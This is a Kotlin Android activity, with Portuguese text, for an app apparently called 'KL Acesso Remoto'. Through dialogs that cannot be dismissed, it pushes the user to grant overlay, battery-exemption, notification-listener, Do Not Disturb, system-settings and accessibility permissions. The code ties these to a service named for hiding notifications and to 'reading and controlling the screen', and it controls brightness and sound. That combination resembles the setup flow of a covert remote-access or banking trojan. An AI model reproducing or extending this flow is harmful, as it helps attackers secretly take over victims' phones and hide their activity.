package com.meuacesso.remoto

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.Manifest
import android.content.ComponentName
import android.content.pm.PackageManager

class MainActivity : AppCompatActivity() {
    private val SOLICITAR_REDE = 1001
    private val SOLICITAR_JANELA_SOBREPOSTA = 1002
    private val SOLICITAR_BATERIA = 1003
    private val SOLICITAR_ACESSIBILIDADE = 1004

    private val SOLICITAR_NOTIFICACAO = 1005
    private val SOLICITAR_ACESSO_NOTIFICACOES = 1006
    private val SOLICITAR_BRILHO = 1007

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        sequenciaInicial()
    }

    private fun sequenciaInicial() {
        if (!temPermissaoRede()) {
            pedirPermissoesRede()
        } else if (!temPermissaoNotificacao()) {
            pedirPermissaoNotificacao()
        } else if (!temPermissaoSobreporTelas()) {
            pedirPermissaoSobreporTelas()
        } else {
            pedirAjusteBateria()
        }
    }

    private fun pedirAcessoOcultarNotificacoes() {
        if (temAcessoLeituraNotificacoes() && temAcessoPoliticaNotificacoes() && temPermissaoBrilho()) {
            mostrarVerificacaoAcessibilidade()
            return
        }

        AlertDialog.Builder(this)
            .setTitle("Permissoes extras")
            .setMessage(
                "Para o painel controlar overlay, brilho e som:\n\n" +
                        "1. Ative o acesso a notificacoes do KL\n" +
                        "2. Ative a politica de Nao Perturbar\n" +
                        "3. Permita alterar configuracoes do sistema (brilho)\n" +
                        "4. Volte e clique em VERIFICAR"
            )
            .setPositiveButton("Configurar") { _, _ ->
                when {
                    !temAcessoLeituraNotificacoes() -> {
                        startActivityForResult(
                            Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"),
                            SOLICITAR_ACESSO_NOTIFICACOES
                        )
                    }
                    !temAcessoPoliticaNotificacoes() -> {
                        startActivityForResult(
                            Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS),
                            SOLICITAR_ACESSO_NOTIFICACOES
                        )
                    }
                    !temPermissaoBrilho() -> {
                        startActivityForResult(
                            Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                                data = Uri.parse("package:$packageName")
                            },
                            SOLICITAR_BRILHO
                        )
                    }
                    else -> mostrarVerificacaoAcessibilidade()
                }
            }
            .setNegativeButton("Pular") { _, _ -> mostrarVerificacaoAcessibilidade() }
            .setCancelable(false)
            .show()
    }

    private fun temPermissaoBrilho(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.System.canWrite(this)
        } else {
            true
        }
    }

    private fun temAcessoLeituraNotificacoes(): Boolean {
        val servico = ComponentName(packageName, ServicoOcultarNotificacoes::class.java.name)
        val lista = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        ) ?: return false
        return lista.contains(servico.flattenToString())
    }

    private fun temAcessoPoliticaNotificacoes(): Boolean {
        val nm = getSystemService(android.app.NotificationManager::class.java)
        return nm.isNotificationPolicyAccessGranted
    }

    private fun temPermissaoNotificacao(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    private fun pedirPermissaoNotificacao() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                SOLICITAR_NOTIFICACAO
            )
        } else {
            sequenciaInicial()
        }
    }

    private fun temPermissaoRede(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE) == PackageManager.PERMISSION_GRANTED
    }

    private fun pedirPermissoesRede() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE),
            SOLICITAR_REDE
        )
    }

    private fun temPermissaoSobreporTelas(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
    }

    private fun pedirPermissaoSobreporTelas() {
        AlertDialog.Builder(this)
            .setTitle("Permissão necessária")
            .setMessage("Permita que o app apareça sobre outros aplicativos.")
            .setPositiveButton("Ir para configurações") { _, _ ->
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                startActivityForResult(intent, SOLICITAR_JANELA_SOBREPOSTA)
            }
            .setCancelable(false)
            .show()
    }

    private fun pedirAjusteBateria() {
        AlertDialog.Builder(this)
            .setTitle("Ajuste de Bateria")
            .setMessage("Para o app não fechar sozinho:\n\n✅ 1. Toque em AVANÇAR\n✅ 2. Selecione: Não otimizar / Sem restrições\n✅ 3. Volte aqui depois de configurar")
            .setPositiveButton("Avançar") { _, _ ->
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
                startActivityForResult(intent, SOLICITAR_BATERIA)
            }
            .setNegativeButton("Nao tem essa opcao") { _, _ ->
                pedirAcessoOcultarNotificacoes()
            }
            .setCancelable(false)
            .show()
    }

    private fun mostrarVerificacaoAcessibilidade() {
        if (!estaAcessibilidadeAtiva()) {
            AlertDialog.Builder(this)
                .setTitle("Ativar Serviço de Acessibilidade")
                .setMessage("Esse passo e obrigatorio para ler e controlar a tela:\n\n1. Toque em IR PARA CONFIGURACOES\n2. Procure por: KL Acesso Remoto\n3. Ative a chave e confirme\n4. Volte aqui e clique em VERIFICAR\n\nXiaomi/Android 16: tambem ative Autostart e Sem restricoes de bateria.")
                .setPositiveButton("Ir para configurações") { _, _ ->
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    startActivityForResult(intent, SOLICITAR_ACESSIBILIDADE)
                }
                .setNegativeButton("Verificar se já ativei") { _, _ ->
                    if (estaAcessibilidadeAtiva()) {
                        Toast.makeText(this, "✅ Tudo pronto! Serviço ativado e funcionando.", Toast.LENGTH_LONG).show()
                        finish()
                    } else {
                        Toast.makeText(this, "❌ Acessibilidade ainda NÃO está ativada! Vá até as configurações.", Toast.LENGTH_LONG).show()
                        mostrarVerificacaoAcessibilidade()
                    }
                }
                .setCancelable(false)
                .show()
        } else {
            Toast.makeText(this, "✅ Tudo pronto! Serviço ativado e funcionando.", Toast.LENGTH_LONG).show()
            finish()
        }
    }

    private fun estaAcessibilidadeAtiva(): Boolean {
        return try {
            val servico = ComponentName(packageName, "com.meuacesso.remoto.ControleGestosService")
            val listaServicos = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            listaServicos.contains(servico.flattenToString())
        } catch (e: Exception) {
            false
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == SOLICITAR_REDE || requestCode == SOLICITAR_NOTIFICACAO) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                sequenciaInicial()
            } else if (requestCode == SOLICITAR_REDE) {
                Toast.makeText(this, "Sem permissao de internet, nao funciona!", Toast.LENGTH_LONG).show()
                finish()
            } else {
                sequenciaInicial()
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            SOLICITAR_JANELA_SOBREPOSTA -> pedirAjusteBateria()
            SOLICITAR_BATERIA -> pedirAcessoOcultarNotificacoes()
            SOLICITAR_ACESSO_NOTIFICACOES,
            SOLICITAR_BRILHO -> pedirAcessoOcultarNotificacoes()
            SOLICITAR_ACESSIBILIDADE -> mostrarVerificacaoAcessibilidade()
        }
    }
}